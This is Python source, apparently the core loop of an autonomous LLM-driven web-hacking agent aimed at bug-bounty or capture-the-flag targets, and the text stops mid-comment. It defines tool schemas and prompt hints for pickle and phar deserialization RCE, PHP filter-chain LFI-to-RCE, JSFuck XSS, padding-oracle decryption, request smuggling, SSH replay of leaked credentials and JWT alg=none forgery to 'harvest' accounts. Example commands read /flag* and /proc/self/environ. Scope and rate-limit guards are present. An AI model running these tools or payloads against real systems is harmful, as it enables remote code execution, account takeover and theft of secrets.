"""The main ReAct loop — AVCI's brainstem.

Wires the LLM (LiteLLM — any provider), scope guard, recon engine, probe kit (45
oracle-backed classes), browser, MCP servers, registration chain, lifecycle
ledger, rate limiter, cost tracker, context compaction, evidence vault and
checkpoint/resume into one tool-calling loop. Every outbound byte passes
ScopeGuard + RateLimiter; every request lands in requests.jsonl.
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
from datetime import datetime, timezone
from pathlib import Path

import httpx

from avci.core.http import make_client

from ..config import Settings
from ..core.compaction import compact as compact_messages
from ..core.cost import CostTracker
from ..core.guardrail import guard_output
from ..core.notify import Notifier
from ..core.ratelimit import RateLimiter
from ..core.replay import (Replayer, find_matches, inject_headers,
                           inject_payload, load_captured, to_curl)
from ..identity.dual import DualIdentity
from ..llm.client import LLMClient
from ..mcp.client import MCPManager, strip_invisibles
from ..scope.guard import ScopeGuard, ScopeViolation
from ..store.authvault import AuthVault
from ..store.evidence import EvidenceVault
from ..store.profiles import ProfileStore
from ..store.state import RunState, TodoItem
from ..browser.driver import BrowserDriver
from ..email.registration import RegistrationDriver
from ..vulns.oob import OOBManager
from ..bridge import BRIDGES
from ..vulns.probes3 import DeepProbeKit
from .lifecycle import LifecycleTools, schema
from .prompts import SYSTEM_PROMPT, build_user_kickoff

log = logging.getLogger("avci.agent")

_PROBE_NAMES = sorted(DeepProbeKit.full_registry())


def _short(text: str, limit: int = 6000) -> str:
    if len(text) <= limit:
        return text
    return text[:limit // 2] + f"\n…[{len(text) - limit} bytes elided]…\n" + text[-limit // 2:]


def _decode_cookie_hint(value: str) -> str:
    """Classify a cookie value into an actionable shape hint."""
    import base64
    import binascii
    v = value.strip()
    # JWT: three dot-separated base64url segments
    if v.count(".") == 2 and len(v.split(".")[0]) >= 8:
        return ("JWT (header.payload.signature) — run probe jwt_tamper "
                "NEXT on the page that displays your identity (url=that "
                "page, token=<this value>, cookie_name=<this cookie>): it "
                "junk-signs and alg=none's the token, flips user_id/role "
                "claims and sweeps neighbor ids; a body change = signature "
                "NOT verified = identity claims are writable — re-read "
                "with the winning token and harvest that account")
    # try base64 (with repaired padding) — the standard transport for
    # serialized blobs in cookies
    for cand in (v, v + "=" * (-len(v) % 4)):
        try:
            raw = base64.b64decode(cand, validate=False)
            txt = raw.decode("utf-8", "replace")
        except (binascii.Error, ValueError):
            continue
        head = txt.lstrip()[:16]
        if raw[:1] == b"\x80" and len(raw) > 2:
            return (f"base64→PYTHON PICKLE (protocol {raw[1]}) — the app "
                    f"pickle.loads()s this cookie: DIRECT RCE, not a hint. "
                    f"Call the pickle_rce tool (code=env; cat /flag*; "
                    f"/proc/self/environ — channel=return if the page "
                    f"renders the loads() result, channel=template if it "
                    f"loops item attributes, channel=blind otherwise), "
                    f"re-encode, replay via headers={{\"Cookie\": "
                    f"\"<name>=<payload>\"}} PLUS every companion cookie "
                    f"the app requires — then re-GET the same endpoint")
        if head.startswith(("a:", "O:", "s:", "i:", "N;")):
            return (f"base64→PHP-serialized: {txt[:200]!r} — fields are "
                    f"forgeable (type-juggling b:1/i:0 for `==`-compared "
                    f"secrets, role/id swaps); re-encode base64, replay via "
                    f"headers={{\"Cookie\": \"name=<value>\"}}")
        if head.startswith(("{", "[")):
            return (f"base64→JSON: {txt[:200]!r} — edit fields (role/id/"
                    f"admin flags), re-encode, replay as Cookie header")
        if "!python" in txt or (
                txt.lstrip()[:1] in ("-",) or
                (txt.lstrip()[:1].isalpha() and
                 ":" in txt.split("\n")[0] and
                 not head.startswith(("{", "[")))):
            return (f"base64→YAML-ish: {txt[:200]!r} — a full-Loader "
                    f"YAML app may deserialize !!python/object/apply "
                    f"(RCE); re-encode base64, replay as Cookie header")
    # hex blob, block-multiple length: IV+ciphertext candidate
    try:
        if len(v) >= 32 and len(v) % 2 == 0 and all(
                c in "0123456789abcdefABCDEF" for c in v):
            n = len(v) // 2
            if n % 8 == 0 or n % 16 == 0:
                return (f"hex, {n} bytes (block-multiple) — likely IV+"
                        f"ciphertext session blob: CBC bit-flip / padding-"
                        f"oracle candidate (see crypto doctrine)")
    except Exception:  # noqa: BLE001
        pass
    return ""


def _cookie_digest(client, pre_jar: dict) -> str:
    """Impossible-to-miss cookie section appended to every http result."""
    try:
        post = {c.name: c.value for c in client.cookies.jar}
    except Exception:  # noqa: BLE001
        return ""
    changed = {k: v for k, v in post.items()
               if k not in pre_jar or pre_jar[k] != v}
    if not changed and not post:
        return ""
    lines = ["── cookies ───────────────────────────────────────"]
    for name, val in changed.items():
        hint = _decode_cookie_hint(val)
        shown = val if len(val) <= 64 else val[:61] + "…"
        mark = "* NEW " if name not in pre_jar else "* CHG "
        lines.append(f"{mark}{name}={shown}")
        if hint:
            lines.append(f"  ⚑ {hint}")
    jar = "; ".join(f"{k}={v[:40]}" for k, v in post.items()) or "(empty)"
    lines.append(f"jar now: {jar[:400]}")
    if changed:
        lines.append("Cookies ride ONLY if you replay them: pass "
                     "headers={\"Cookie\": \"…\"} on the next http call "
                     "(the jar is shared, but explicit headers win).")
    return "\n".join(lines)


def _link_digest(url: str, r) -> str:
    """In-app navigation surfaced next to the body: agents routinely
    ignore <a href> buried in HTML and never walk the authenticated
    surface where IDOR/privesc actually live."""
    ctype = (r.headers.get("content-type") or "").lower()
    body = r.text or ""
    if "html" not in ctype and "<a " not in body[:4000]:
        return ""
    import re
    from urllib.parse import urljoin, urlsplit
    hrefs = re.findall(r'(?:href|action)=["\']([^"\']+)["\']', body)
    base = urlsplit(url)
    seen, links, forms = set(), [], 0
    for h in hrefs:
        if h.startswith(("#", "javascript:", "data:", "mailto:", "tel:")):
            continue
        try:
            u = urljoin(url, h)
            p = urlsplit(u)
        except Exception:  # noqa: BLE001
            continue
        if p.netloc and p.netloc != base.netloc:
            continue  # third-party links are decoys, not surface
        path = p.path or "/"
        if p.query:
            path += "?" + p.query[:60]
        if path in seen:
            continue
        seen.add(path)
        if re.search(r"\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|map)$", path):
            continue
        if len(links) < 15:
            links.append(path)
    if not links:
        return ""
    return ("── links on this page ─────────────────────────────\n"
            + "\n".join(links)
            + "\n(walk these — post-auth pages carry the IDOR/privesc "
              "surface; note every id/username path segment)")


_FILTER_WORDS = ("forbidden", "blocked", "disallowed", "not allowed",
                 "invalid character", "illegal character", "characters are",
                 "can't use", "cannot use", "cant use")


def _looks_filtered(body: str) -> bool:
    """A response that name-checks INPUT CHARACTERS is the app admitting it
    hands that input to something that cares about syntax (a template
    engine, a parser, a script string) — nobody filters delimiters for
    data."""
    low = (body or "").lower()
    return any(w in low for w in _FILTER_WORDS)


# one representative per character class — the blacklist map costs ~14
# requests and turns "it rejected everything" into a technique choice
_BL_PROBES = (("letter", "q"), ("digit", "7"), ("lt", "<"), ("gt", ">"),
              ("dquote", '"'), ("squote", "'"), ("backslash", "\\"),
              ("plus", "+"), ("bang", "!"), ("bracket", "["),
              ("paren", "("), ("brace", "{"), ("percent", "%"),
              ("backtick", "`"), ("equals", "="), ("slash", "/"))


def _named_char(body: str) -> str:
    """Extract the single character the filter just named (the per-char
    rejection shape 'Sorry you can't use: x') — '' when not that shape."""
    import re as _re
    m = _re.search(r"(?:use|character|char|symbol|allowed)[:\s]*"
                   r"['\"`<]?(.)['\"'>]?", body or "")
    return m.group(1) if m else ""


def _redirect_digest(r) -> str:
    """The hop chain surfaced next to the body: with redirects followed
    silently, the agent reads a password page while believing it is still
    on the URL it asked for — multi-step auth flows die right there."""
    try:
        hist = list(r.history)
    except Exception:  # noqa: BLE001
        hist = []
    lines = []
    if hist:
        hops = []
        for h in hist[:6]:
            hops.append(f"{h.request.method} {h.request.url.path} → {h.status_code}")
        lines.append(" → ".join(hops) + f" → FINAL {r.url.path}")
        lines.append("(you are NOT on the URL you asked for — this page's real "
                     "URL is the FINAL path; multi-step auth flows continue "
                     "HERE: POST the next field to the final path, path params "
                     "like /password/<username> replace body params)")
    # JSON-body navigation: apps that answer logins with
    # {"success": true, "redirect": "/x"} instead of a 302 — the field
    # IS the next hop and nothing else will surface it
    try:
        ct = (r.headers.get("content-type") or "").lower()
        body = (r.text or "")[:2000]
        if "json" in ct or body[:1] in "{[":
            import json as _json
            j = _json.loads(body)
            if isinstance(j, dict):
                for k in ("redirect", "next", "location", "url",
                          "redirect_url", "redirect_to"):
                    v = j.get(k)
                    if isinstance(v, str) and v.startswith("/"):
                        lines.append(f'(JSON body says "{k}": "{v}" — that '
                                     "is your NEXT request; issue it now, "
                                     "then re-GET / to let the index route "
                                     "branch on your new session role)")
                        break
    except Exception:  # noqa: BLE001
        pass
    if not lines:
        return ""
    return "── redirects ────────────────────────────────\n" + "\n".join(lines)
    hops = []
    for h in hist[:6]:
        hops.append(f"{h.request.method} {h.request.url.path} → {h.status_code}")
    lines = [" → ".join(hops) + f" → FINAL {r.url.path}"]
    lines.append("(you are NOT on the URL you asked for — this page's real "
                 "URL is the FINAL path; multi-step auth flows continue "
                 "HERE: POST the next field to the final path, path params "
                 "like /password/<username> replace body params)")
    return "── redirects ────────────────────────────────\n" + "\n".join(lines)


class HunterAgent:
    def __init__(self, settings: Settings, guard: ScopeGuard,
                 run_dir: Path, run_id: str,
                 mcp_manager: MCPManager | None = None,
                 tui=None, resume_state: dict | None = None,
                 goal: str = "") -> None:
        self.s = settings
        self.guard = guard
        self.goal = goal
        self.llm = LLMClient(settings.llm)
        self.state = RunState(run_dir, run_id)
        self.mcp = mcp_manager or MCPManager()
        self.vault = AuthVault(run_dir / "vault")
        self.evidence = EvidenceVault(run_dir / "evidence")
        self.profiles = ProfileStore(run_dir / "vault", self.vault)
        self.browser = BrowserDriver(self.mcp)
        self.reg = RegistrationDriver(guard, self.vault, self.browser)
        self.oob = OOBManager()
        self.probes = DeepProbeKit(guard, oob=self.oob)
        self.rl = RateLimiter()
        self.identities = DualIdentity(self.reg, guard, self.rl,
                                       self.state.log_request,
                                       self.state.dir)
        self.cost = CostTracker(settings.llm.model, run_dir)
        self.notifier = Notifier.from_env(Path("configs/notify.json"))
        self.finish_flag: dict = {"done": False, "summary": ""}
        self.lifecycle = LifecycleTools(self.state, self.finish_flag,
                                        notifier=self.notifier)
        # fleet passes a shared MCP manager — only close what we own
        self._own_mcp = mcp_manager is None
        self._surface_path: Path | None = None
        self._client = make_client(
            timeout=25, follow_redirects=True, verify=False,
            headers={"User-Agent": settings.recon.user_agent},
        )
        # ---- observability (TUI + resume) --------------------------------
        self.tui = tui
        if tui is not None:
            tui.bind_agent(self)
        self.iterations = 0
        self._net_idle = 0          # consecutive iters with zero wire requests
        self._reqs_at_iter = 0
        self.phase_label = "init"
        self.stop_requested = False
        self.resume_state = resume_state

    # ==================================================================
    # hooks
    # ==================================================================
    def _hook(self, kind: str, detail: str = "") -> None:
        if self.tui is not None:
            try:
                self.tui.agent_hook(kind, detail)
            except Exception:  # noqa: BLE001
                pass

    def cost_summary(self) -> dict:
        return self.cost.summary()

    # ==================================================================
    # tool schemas
    # ==================================================================
    def _tool_schemas(self) -> list[dict]:
        tools = [
            schema("http", (
                "Raw HTTP request to any in-scope URL. Returns status, "
                "headers, and a body excerpt. Use for API poking, replay, "
                "auth-bearing calls."
            ), {
                "method": {"type": "string", "enum":
                           ["GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS"]},
                "url": {"type": "string"},
                "headers": {"type": "object", "additionalProperties": {"type": "string"}},
                "body": {"type": "string"},
            }, ["method", "url"]),
            schema("ssh_exec", (
                "Run one command over SSH with given credentials against an "
                "in-scope SSH port. Use when disclosed creds (source leaks, "
                "config dumps, base64-decoded passwords) need replaying, or "
                "to read files on the SSH host. Connection is per-call."
            ), {
                "host": {"type": "string"},
                "port": {"type": "integer", "default": 22},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "key_path": {"type": "string",
                             "description": "private key file instead of password"},
                "command": {"type": "string"},
            }, ["host", "username", "command"]),
            schema("http_save", (
                "Download a URL's bytes to the run's artifacts dir (db dumps, "
                "backups, archives, APKs — anything binary an http excerpt "
                "cannot show). Returns path+size+sha256; then file_inspect it."
            ), {
                "url": {"type": "string"},
                "name": {"type": "string",
                         "description": "local filename (default from URL)"},
            }, ["url"]),
            schema("file_inspect", (
                "Offline analysis of a saved artifact: SQLite databases are "
                "fully dumped (tables+columns+rows), ZIP archives listed, "
                "plus a strings excerpt and a base64-token decode table."
            ), {
                "path": {"type": "string"},
            }, ["path"]),
            schema("read_file", (
                "Read a saved artifact (or local file) as a text or hex "
                "excerpt — use after http_save for full-content paging."
            ), {
                "path": {"type": "string"},
            }, ["path"]),
            schema("phar_rce", (
                "Forge a SIGNED .phar archive natively (no PHP runtime "
                "needed) whose member unserializes to the gadget object "
                "with your code in the eval'd property — for upload + "
                "phar:// read chains. Read the gadget class + property "
                "names from disclosed source first."
            ), {
                "code": {"type": "string",
                         "description": "PHP statements the gadget "
                         "evals/execs, e.g. "
                         "echo file_get_contents('/flag.txt');"},
                "class_name": {"type": "string",
                               "description": "gadget class name "
                               "(default CustomTemplate)"},
                "data_prop": {"type": "string",
                              "description": "property the gadget evals "
                              "(default data)"},
                "member": {"type": "string",
                           "description": "archive member name the reader "
                           "opens (default manifest)"},
                "extra_props": {"type": "object",
                                "description": "extra props the gadget "
                                "constructor needs"},
            }, ["code"]),
            schema("filter_chain", (
                "Generate a php://filter/convert.iconv... chain URL that, "
                "when include()'d / require()'d by the target, executes your "
                "PHP code — LFI-to-RCE with NO upload, NO writable file, NO "
                "filename guess (resource=php://temp works). Call this "
                "whenever an include/require path takes user input, or an "
                "attacker-controlled PREFIX is prepended to a fixed include "
                "suffix (set resource= to the real on-disk path the suffix "
                "completes). Code is auto-wrapped: <?php <code> // — do NOT "
                "hand-build the iconv chain."
            ), {
                "code": {"type": "string",
                         "description": "PHP statements, e.g. "
                         "echo file_get_contents('/flag.txt'); — the "
                         "echo/system output is the flag channel"},
                "resource": {"type": "string",
                             "description": "file the filter reads "
                             "(default php://temp; use the real path when "
                             "a forced suffix must complete it, e.g. "
                             "/var/www/html/wp-content/plugins/X/)"},
                "wrap": {"type": "boolean",
                         "description": "keep default true (adds <?php and "
                         "// comment terminator)"},
            }, ["code"]),
            schema("jsfuck", (
                "Encode JS into a zero-alphanumeric payload (no letters, "
                "digits, < or >) for blacklist XSS. context=string assumes "
                "you land inside a JS string (var x = \"HERE\") and emits "
                "the \"; closer + trailing //; context=expr is the bare "
                "expression for HTML-attr/event contexts. Verify the "
                "emitted payload matches the sink, then submit it as the "
                "parameter value."
            ), {
                "code": {"type": "string",
                         "description": 'JS to execute, e.g. alert("XSS")'},
                "context": {"type": "string",
                            "description": "string (default) | expr"},
            }, ["code"]),
            schema("http_burst", (
                "Fire up to 24 requests NEAR-SIMULTANEOUSLY (one async "
                "batch, shared cookie jar). The race/TOCTOU probe: pair a "
                "state-changing call with a read that trusts stale state. "
                "Also the tool for one-time tokens, limit bypasses and "
                "double-spend windows. Pass `requests` (list) for distinct "
                "calls or `template`+`repeat` to fire N clones."
            ), {
                "requests": {"type": "array", "items": {"type": "object"},
                             "description": ("[{method,url,headers,body,"
                                             "delay_ms}, …] mutually "
                                             "exclusive with template. "
                                             "delay_ms staggers that one "
                                             "request — the race-timing "
                                             "knob for asymmetric endpoints "
                                             "(see race doctrine)")},
                "template": {"type": "object",
                             "description": "one {method,url,headers,body}"},
                "repeat": {"type": "integer",
                           "description": "clone template this many times"},
            }, []),
            schema("pickle_rce", (
                "Forge base64(pickle) executing a shell command for Python "
                "deserialization sinks (gASV… cookie/param values, "
                "pickle.loads surfaces). channel=return makes loads() "
                "RETURN the command output so the app renders it (no OOB "
                "needed); channel=template returns a list of one object "
                "whose EVERY attribute is the output — use it when the "
                "page renders object attributes ({{ item.name }}-style "
                "loops) and a raw string renders empty; channel=blind is "
                "os.system. Submit the emitted base64 verbatim as the "
                "cookie/param value."
            ), {
                "cmd": {"type": "string",
                        "description": "shell command, e.g. "
                                       "cat /flag* /proc/self/environ"},
                "channel": {"type": "string",
                            "description": "return (default) | template | blind"},
            }, ["cmd"]),
            schema("padding_oracle", (
                "Run a full CBC padding-oracle decryption. Give the "
                "cookie/header value (name=base64(iv||ct)), the submit "
                "field the app compares against, and the response marker "
                "meaning BAD PADDING — the padding/decryption FAILURE text "
                "(e.g. 'Invalid padding'), NOT the wrong-value mismatch "
                "message (that one means padding was VALID). Every other "
                "response counts as valid padding. The tool calibrates "
                "first: if corrupted ciphertexts never produce your "
                "marker it ABORTS with the observed status/length "
                "signatures — flip the marker from those and retry. "
                "Returns the decrypted plaintext — then submit it for "
                "the win. ~250 requests per 16-byte block."
            ), {
                "url": {"type": "string"},
                "cookie": {"type": "string",
                           "description": "name=<base64 iv||ct>"},
                "data_field": {"type": "string",
                               "description": "form field compared to the "
                                              "decrypted value"},
                "data_value": {"type": "string"},
                "method": {"type": "string"},
                "invalid_marker": {"type": "string"},
                "valid_marker": {"type": "string",
                                 "description": "optional stricter marker "
                                                "for valid padding"},
            }, ["url", "cookie", "data_field", "invalid_marker"]),
            schema("raw_socket", (
                "Open ONE TCP connection and send raw bytes the http tool "
                "cannot express — the request-smuggling primitive "
                "(conflicting Content-Length + Transfer-Encoding, smuggled "
                "second requests, half-open header prefixes). Every entry "
                "of `sends` goes out on the SAME socket in order (that is "
                "the point: the follow-up request completes the poisoned "
                "prefix); the full transcript comes back. Use \\r\\n "
                "escapes or real newlines. Scope-enforced per host:port."
            ), {
                "host": {"type": "string"},
                "port": {"type": "integer"},
                "sends": {"type": "array", "items": {"type": "string"},
                          "description": ("1..N raw payloads, sent in order "
                                          "on the same connection")},
                "gap_seconds": {"type": "number", "default": 1.0},
                "read_seconds": {"type": "number", "default": 4.0},
            }, ["host", "port", "sends"]),
            schema("surface_recon", (
                "Run the full recon fan-out (subdomains → probe → crawl → "
                "JS mining → params → ports → sensitive paths → takeover) "
                "and cache the SurfaceModel. Slow — run once per run."
            ), {"domain": {"type": "string"}}, ["domain"]),
            schema("read_surface", (
                "Read the cached SurfaceModel (hosts, pages, forms, params, "
                "api paths, JS findings, secrets, ports)."
            ), {}),
            schema("probe", (
                f"Fire an oracle-backed vulnerability probe. name ∈ "
                f"{json.dumps(_PROBE_NAMES)}. Verdicts are CONFIRMED/FAILED/"
                "PENDING with evidence receipts. idor_swap benefits from "
                "auth headers. traversal works WITHOUT param — it "
                "param-mines file-param names on the given URL."
            ), {
                "name": {"type": "string"},
                "url": {"type": "string"},
                "param": {"type": "string"},
                "token": {"type": "string"},
                "auth_headers": {"type": "object",
                                  "additionalProperties": {"type": "string"}},
            }, ["name", "url"]),
            schema("oob_create", (
                "Create an out-of-band callback URL (blind SSRF/XXE/RCE "
                "oracle). Plant the returned URL in payloads, then oob_poll. "
                "With content= it ALSO serves your exact bytes at the URL "
                "root for any query string — an RFI host for include/require "
                "bugs that append a fixed suffix (add '?' after the URL)."
            ), {"content": {"type": "string",
                            "description": "bytes to serve (e.g. PHP code) "
                                           "at the channel root"}}),
            schema("oob_poll", (
                "Poll every OOB channel for callbacks. Returns hits with "
                "source IP — a callback = CONFIRMED blind bug."
            ), {}),
            schema("bridge_run", (
                "Run an external tool bridge for force-multiplication. "
                "name ∈ [\"nuclei\", \"httpx\", \"sqlmap\"] — nuclei: "
                "CVE/misconfig template scan (safe, single URL, no crawl); "
                "httpx: tech fingerprint of a host; sqlmap: active SQLi "
                "confirmation (requires AVCI_ENABLE_SQLMAP=1, RoE-sensitive)."
            ), {
                "name": {"type": "string", "enum": ["nuclei", "httpx", "sqlmap"]},
                "url": {"type": "string",
                        "description": "in-scope target URL (httpx: host ok)"},
            }),
            schema("http_replay", (
                "Replay a CAPTURED request (from this run's log or an "
                "imported proxy capture) with a payload substituted into "
                "one param — payload-as-data, never string-concatenated. "
                "Returns the response AND a copy-pasteable curl. Use for "
                "chaining (inject then fetch), authenticated replays, and "
                "verifying stored/reflected variants."
            ), {
                "match": {"type": "string",
                          "description": "url substring selecting the captured "
                                         "request (most recent match)"},
                "param": {"type": "string",
                          "description": "param to substitute the payload into"},
                "payload": {"type": "string"},
                "method": {"type": "string"},
                "headers": {"type": "object",
                            "additionalProperties": {"type": "string"}},
                "body": {"type": "string",
                         "description": "replace the captured body entirely"},
                "as_identity": {"type": "string", "enum": ["A", "B"],
                                "description": "install identity A/B session "
                                "(cookies+Authorization) on the replay"},
            }, ["match"]),
            schema("mitm_import", (
                "Import a proxy capture file (Burp/Caido HAR or item JSONL) "
                "full of authenticated traffic. In-scope requests become "
                "replayable captured templates (http_replay match=...) and "
                "endpoint candidates. Out-of-scope rows are dropped."
            ), {"file": {"type": "string",
                         "description": "path to .har / .jsonl capture file"}},
               ["file"]),
            schema("identity_pair", (
                "DUAL-IDENTITY: register two accounts (A/B) on the target and "
                "vault both sessions — the raw material for cross-identity "
                "evidence. Then divergence_check any resource URL, or "
                "http_replay with as_identity to fire a captured request "
                "under either account."
            ), {
                "target_origin": {"type": "string"},
                "signup_path": {"type": "string",
                                "description": "signup endpoint (default "
                                "/api/register)"},
            }, ["target_origin"]),
            schema("divergence_check", (
                "The superdrug oracle: GET one URL as anonymous, as identity "
                "A and as identity B. Reports status/body divergence with a "
                "verbatim evidence string — paste it into add_finding; the "
                "triage gate demands demonstrated divergence for "
                "anonymous-ownership claims."
            ), {"url": {"type": "string"}}, ["url"]),
            schema("browser", (
                "Drive the browser (MCP wondersuite passthrough or local "
                "playwright). action ∈ {goto, click, fill, eval, content, "
                "screenshot, links, forms} — links/forms map the SPA attack "
                "surface (every link and form field on the current page)."
            ), {
                "action": {"type": "string",
                           "enum": ["goto", "click", "fill", "eval", "content",
                                     "screenshot", "links", "forms"]},
                "url": {"type": "string"},
                "selector": {"type": "string"},
                "value": {"type": "string"},
                "expr": {"type": "string"},
                "path": {"type": "string"},
            }, ["action"]),
            schema("register_account", (
                "OFFENSIVE CHAIN: inbox (mail.tm→guerrilla fallback) → signup "
                "on target → poll OTP/verify link → activate → vault session."
            ), {
                "target_origin": {"type": "string"},
                "signup_path": {"type": "string"},
                "verify_base": {"type": "string"},
                "use_browser": {"type": "boolean"},
            }, ["target_origin"]),
            schema("vault_load", (
                "Load a previously vaulted authenticated session (cookies + "
                "Authorization headers) into the shared client."
            ), {"target": {"type": "string"}}, ["target"]),
            schema("auth_profile", (
                "Manage login profiles for provided test accounts. op ∈ "
                "{save, list, login}. login runs the recipe and installs "
                "the session."
            ), {
                "op": {"type": "string", "enum": ["save", "list", "login"]},
                "name": {"type": "string"},
                "target": {"type": "string"},
                "kind": {"type": "string", "enum": ["form", "json"]},
                "login_url": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "username_field": {"type": "string"},
                "password_field": {"type": "string"},
                "success_marker": {"type": "string"},
            }, ["op"]),
            schema("check_scope", (
                "Verify a URL is inside authorized scope before building "
                "payloads against it."
            ), {"url": {"type": "string"}}, ["url"]),
        ]
        tools += self.lifecycle.schemas()
        return tools

    # ==================================================================
    # dispatch
    # ==================================================================
    async def _dispatch(self, name: str, args: dict) -> str:
        try:
            if name.startswith("mcp_"):
                return await self.mcp.call(name, args)
            lc_names = {s["function"]["name"] for s in self.lifecycle.schemas()}
            if name in lc_names:
                return await self.lifecycle.dispatch(name, args)
            return await self._dispatch_core(name, args)
        except ScopeViolation as sv:
            self.state.log_event("scope_violation", tool=name, detail=str(sv))
            self._scope_blocks = getattr(self, "_scope_blocks", 0) + 1
            msg = f"SCOPE-VIOLATION (request blocked): {sv}"
            if self._scope_blocks >= 3:
                msg += (
                    "\n\n⚠ SCOPE ANCHOR — you have now been scope-blocked "
                    f"{self._scope_blocks} times. The out-of-scope target is "
                    "CLOSED: do not request it again in any form (no port "
                    "guessing, no ssh, no alternate hosts, no 'just once "
                    "more'). Every further request must go to the exact "
                    "scope rules given at run start. Re-read the scope, "
                    "pick the next UNTRIED in-scope surface, and continue "
                    "the hunt there."
                )
            return msg
        except Exception as exc:  # noqa: BLE001
            log.exception("tool %s crashed", name)
            self._hook("error", f"{name}: {exc}")
            return f"ERROR: {type(exc).__name__}: {exc}"

    async def _filter_followup(self, url: str) -> str:
        """Re-probe a param the app just rejected with a character filter:
        run the ssti battery (its payload set carries the {% %} statement-tag
        canaries that survive {{ }} filters) on up to 2 query params and
        attach the verdict to the tool result."""
        from urllib.parse import parse_qsl, urlsplit
        parts = urlsplit(url)
        params = [k for k, _ in parse_qsl(parts.query,
                                          keep_blank_values=True)][:2]
        lines = []
        for p in params:
            try:
                out = await self.probes.ssti(url, p)
            except Exception:  # noqa: BLE001
                continue
            v = out.verdict
            tag = "⚑" if v.verdict == "CONFIRMED" else "·"
            lines.append(f"{tag} ssti[{p}]: {v.verdict} — {v.reason[:200]}"
                         + (f" ({out.note})" if out and out.note else ""))
        if not lines:
            return ""
        return ("── filter-bypass battery (auto) ────────────────────\n"
                + "\n".join(lines)
                + "\n(a CONFIRMED line means the app renders this param — "
                  "escalate with |attr() chains / blind {% if %} oracle)")

    async def _blacklist_map(self, method: str, url: str, body,
                             headers: dict, param: str) -> str:
        """Calibrate a per-character filter: fire one probe per character
        class through the SAME request shape and read which classes the
        app names back. ~16 rate-limited requests that convert 'everything
        is rejected' into the correct bypass technique."""
        form = {}
        if isinstance(body, str) and "=" in body:
            try:
                from urllib.parse import parse_qsl
                form = dict(parse_qsl(body, keep_blank_values=True))
            except Exception:  # noqa: BLE001
                form = {}
        banned = []
        for cls, ch in _BL_PROBES:
            # bare char for every class — a wrapping "a< a" makes the app
            # name the LETTER first and the symbol class reads as allowed
            probe_val = ch
            if form:
                if param not in form:
                    continue
                b = dict(form)
                b[param] = probe_val
                from urllib.parse import urlencode
                payload = urlencode(b)
                hdrs = dict(headers or {})
                hdrs.setdefault("content-type",
                                "application/x-www-form-urlencoded")
            else:
                from urllib.parse import urlencode
                sep = "&" if "?" in url else "?"
                payload = ""
                hdrs = headers
                u = f"{url}{sep}{urlencode({param: probe_val})}"
            try:
                await self.rl.acquire(url)
                rr = await self._client.request(
                    method, u if not form else url,
                    content=payload if form else None, headers=hdrs)
                # only count when the app NAMES the exact char we sent —
                # rejection pages quote the char, so substring checks lie
                if _looks_filtered(rr.text) and _named_char(rr.text) == ch:
                    banned.append(cls)
            except Exception:  # noqa: BLE001
                continue
        if not banned:
            return ""
        letters = {"letter"} <= set(banned)
        digits = {"digit"} <= set(banned)
        meta = {"lt", "gt"} <= set(banned)
        tips = []
        if letters and digits and meta:
            tips.append("FULL-ALNUM+TAG blacklist → call the jsfuck tool "
                        "(code=alert(\"XSS\"), context=string) and submit "
                        "its output verbatim as this param's value")
        elif letters and digits:
            tips.append("alnum banned, tags ALLOWED → jsfuck still applies "
                        "if the sink is a script string; otherwise custom-"
                        "element + onfocus")
        if {"dquote", "squote"} >= set(banned) and "backslash" not in banned:
            tips.append("quotes banned, backslash FREE → backslash-quote "
                        "smuggle: the app escapes your quote, you escape "
                        "the backslash — payload \\\" breaks out of a "
                        "var x = \"…\" sink")
        if not banned or "backtick" not in banned:
            tips.append("backtick alive → template literals replace banned "
                        "quotes: alert(atob(`…base64…`)) / unescape(`%58…`)")
        bset = ",".join(banned)
        return ("── blacklist map (auto, param " + param + ") ────────\n"
                f"banned classes: {bset}\n" + "\n".join(tips))

    async def _dispatch_core(self, name: str, args: dict) -> str:
        st = self.state

        # ---- http (rate-limited) ----------------------------------------
        if name == "http":
            method = args.get("method", "GET").upper()
            url = args["url"]
            self.guard.check_url(url)
            await self.rl.acquire(url)
            headers = args.get("headers") or {}
            body = args.get("body")
            # @filter: macro — LLMs corrupt ~5KB iconv chains when copying
            # them into args; let the tool build the chain instead. Value
            # "@filter:<php-code>|<resource>" expands to the full
            # php://filter URL (filter_chain_url) in place.
            def _expand(v):
                if not (isinstance(v, str) and v.startswith("@filter:")):
                    return v
                from ..exploit.filterchain import filter_chain_url
                code, _, res = v[8:].partition("|")
                return filter_chain_url(
                    code, resource=res or "php://temp")
            headers = {k: _expand(v) for k, v in headers.items()}
            try:
                _pre_jar = {c.name: c.value
                            for c in self._client.cookies.jar}
            except Exception:  # noqa: BLE001
                _pre_jar = {}
            r = await self._client.request(method, url, headers=headers,
                                           content=body)
            # mirror any session cookies into the probe kit so oracle-backed
            # probes (idor_swap, xxe on authenticated SOAP, …) hunt WITH the
            # agent's session instead of blind, unauthenticated retries
            if r.headers.get("set-cookie"):
                try:
                    for c in self._client.cookies.jar:
                        self.probes._client.cookies.set(
                            c.name, c.value, domain=c.domain, path=c.path)
                except Exception:  # noqa: BLE001
                    pass
            host = httpx.URL(url).host
            self.rl.note_response(host, r.status_code,
                                  r.headers.get("retry-after"))
            st.log_request(method, url, r.status_code, tool="http")
            # auto-archive large bodies: the elided middle of a truncated
            # page can hold the verdict/flag — disk artifacts must see it
            # even when the context window doesn't (byte-level evidence)
            try:
                _blen = len(r.text or "")
                if _blen > 8000:
                    import re as _re
                    _adir = self.state.dir / "autohttp"
                    _adir.mkdir(parents=True, exist_ok=True)
                    _n = len(list(_adir.iterdir()))
                    if _n < 400:
                        _slug = _re.sub(r"[^A-Za-z0-9._-]", "_",
                                        url.split("://", 1)[-1])[:60]
                        (_adir / (f"{_n:04d}_{method}_"
                                  f"{r.status_code}_{_slug}.txt")
                         ).write_text(f"{method} {url}\n\n{r.text}",
                                      encoding="utf-8", errors="replace")
            except Exception:  # noqa: BLE001
                pass
            hdr_txt = "\n".join(f"{k}: {v}" for k, v in list(r.headers.items())[:25])
            # cookie digest: Set-Cookie buried among headers is routinely
            # missed; serialized/session cookies are the attack surface itself
            cookie_txt = _cookie_digest(self._client, _pre_jar)
            link_txt = _link_digest(url, r)
            redir_txt = _redirect_digest(r)
            # validation-rejection → auto batteries: agents read "forbidden
            # characters" / "you can't use: x", shrug, and move on; the
